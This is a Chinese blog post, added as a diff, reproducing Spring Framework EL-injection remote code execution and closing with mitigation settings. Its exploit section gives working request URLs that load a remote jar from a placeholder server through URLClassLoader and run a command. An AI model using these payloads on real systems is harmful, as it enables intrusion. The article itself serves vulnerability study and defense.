@@ -1,0 +1,104 @@
+---
+layout: post
+title: "Spring框架远程代码执行"
+date: 2014-07-26 00:20:04 +0800
+comments: true
+categories: "技术"
+tags: [Spring,Expression Language] 
+---
+
+### 0x01 概述
+
+2012年12月国外研究者DanAmodio发表《Remote Code with Expression Language Injection》一文，指出Spring框架存在潜在的代码注入风险。在2013年1月，国内安全研究人员在微博上分享了该篇文章的中文翻译内容。
+
+文章中指出Spring框架3.0.6以下版本，在一定的条件下，可以被攻击者利用，执行任意的java代码，从而威胁系统的安全性。而且这些存在潜在威胁的版本，在全球范围中已经下载超过131.4万，由此可见此问题影响极为广泛。
+
+我在这一周中针对文章中所提到的方法，进行了重现。本篇文章将向各位描述这个问题被触发所需要的条件，实现利用的细节，以及相关的一些防护方法。
+
+<!-- more -->
+
+### 0x02 环境搭建
+
+先说下简单的测试代码吧，按照文章中所说的，在搭建好的Spring中添加一个jsp文件，其中包含如下代码：
+
+```java
+<%@page contentType="text/html;charset=GBK"%> 
+<%@ taglib uri="/spring" prefix="spring"  %>
+<html>   
+<head><title>利用Spring输出HelloWorld</title></head>   
+<%  
+String str = (String)request.getAttribute("helloWorld");  
+%> 
+<spring:message text="${param['message']}" code="${param['foo']}"></spring:message>
+<body>
+<font size=’22’><%=str%></font> 
+</body>   
+</html>	
+```
+
+红色代码部分为测试的jsp代码。Spring的message标签的作用是，根据code取得消息资源，如果指定的code没有找到任何对应的消息资源，则采用text定义的内容。这里有一个比较奇怪的地方，文章中说在code属性处添加$param[‘message’]代码，通过访问http://target/file? message=${applicationScope}会在页面中打印出服务器环境的相关配置信息。但是，这个地方无论我用什么办法，都无法让它里面的内容显示出来。所以我不得不将测试的内容放到了text属性中（这两个属性都可以执行EL表达式）。
+
+这个问题虽然有些摸不到头脑，但还是可以接受的，毕竟还是有地方让我做测试。在测试后面的内容才是我噩梦真正的开始！
+
+在一开始测试时，我并没有按照作者所提供的Glassfish3.1.2.2+Spring3.0.6的环境测试，而是搭建Tomcat6.0+Spring3.0.2的环境。当我在这个环境中，想要通过java.lang.String类调用java方法时出现了问题，提示EL表达式错误。访问http://target/file? message= ${param.foo.replaceAll("P","Q")}&foo=PPPPP，错误显示如下图：
+
+![1](/assets/images/2014-07/2014-07-25-01.png)
+
+纠结了一天多的时间，各种搜索，只能搜索到各大网站对这篇文章的转载，没有一个具体分析的文章。在我就要崩溃的时候，发现了这样一句话“After some research, I learned that the EL 2.2 added support for method invocation.”。马上反应过来，这个特性应该是EL2.2新添加的，而Tomcat6.x是支持EL2.1的，然后果断的换成了支持EL2.2的Tomcat7.0。依旧访问那个url，结果如下图：
+
+![2](/assets/images/2014-07/2014-07-25-02.png)
+
+什么都没有！到底执行了没:(。又是崩溃了大半天，最后不得不乖乖的按照文章中环境进行搭建。这次终于成功了，不容易啊！
+
+![3](/assets/images/2014-07/2014-07-25-03.png)
+
+### 0x03 代码执行技术细节
+
+通过上一章最后测试的结果，我们不难看出，在一定的环境下，我们是可以通过EL表达式来调用java代码的。但是由于限制条件，我们能够做的事情也是很有限的。不过，DanAmodio和他的朋友在不断的努力下，终于找到了一个，可以使它执行任意代码的方法。
+
+他们想到通过java的反射机制，来动态的加载一些类和方法。但是，很多的强大的类（如：Runtime）的newinstance方法是不允许被调用的，没有办法对它们进行初始化，也就是说，不能直接的调用这些强大的类和方法。
+
+后来，他们发现了URLClassLoader这个类提供了newinstance这个方法。这个方法是可以动态加载远程代码的类，这样新的利用方法就出炉了！
+首先在我们另一台服务器上放置编译如下代码的jar文件：
+
+```java
+public class Malicious {
+    public Malicious() {
+	   try {
+                  java.lang.Runtime.getRuntime().exec("calc.exe"); //Win
+           } catch (Exception e) {
+           }
+    }
+}
+```
+
+然后我们通过EL表达式创建一个数组（URLClassLoader的构造函数需要URL数组作为参数），存放在session中，url为http://target/file? message=${pageContext.request.getSession().setAttribute("arr","".getClass().forName("java.util.ArrayList").newInstance())}。
+
+下一步我们通过URI提供的create方法，可以创建一个URL实例，我们把这个实例保存在刚刚创建的数组中，url为http://target/file?message= ${pageContext.request.getSession().getAttribute("arr").add(pageContext.getServletContext().getResource("/").toURI().create("http://serverip/Malicious.jar").toURL())}。
+
+Malicious.jar文件就是我们之前保存在另一台服务器中的jar文件。EL表达式中的PageContext类中getClassLoader方法得到的对象的父类便是URLClassLoader，所以，我们便可以调用newInstance方法了，url为http://target/file?message= ${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute("arr").toArray(pageContext.getClass().getClassLoader().getParent().getURLs())).loadClass("Malicious").newInstance()}。
+
+来看下效果图吧，嘿嘿
+
+![4](/assets/images/2014-07/2014-07-25-03.png)
+
+### 0x04 总结
+
+1. 这个问题利用的环境，在目前看来是只有Glassfish3.1.2.2+Spring3.0.6及其之前版本环境可以实现。从理论上来看应该只要服务端支持EL2.2就可以实现，但是不知道什么原因Tomcat7.0虽然支持EL2.2，但是却没有得到我们预想中的效果。
+
+2. 在测试过程中，遇到了一个比较低级的错误，就是编译jar 的java版本与服务端的java版本不符，导致代码无法成功执行。
+
+3. 对于这种问题的防护，我们给出的建议是将Spring升级到3.1以上版本，因为这些新版本默认是将jsp的EL表达式支持关闭的。如果不能升级到3.0.6以上版本，请在web.xml中设置springJspExpressionSupport的参数为false，如下示例：
+
+```xml
+<context-param>
+<description>Spring Expression Language Support</description>
+<param-name>springJspExpressionSupport</param-name>
+<param-value>false</param-value>
+</context-param>
+```
+
+4. 另外即使你使用了Spring3.1以上版本，也要留心这个问题，因为它只是默认关闭了EL表达式的支持，而并不是修补了这个问题，不小心的配置很有可能会使这个问题死灰复燃的。
+
+5. 本篇文章中虽然没有在Tomcat环境中测试成功，但并不代码这个问题不会在这种环境中出现，我们会继续跟踪这个问题。
+
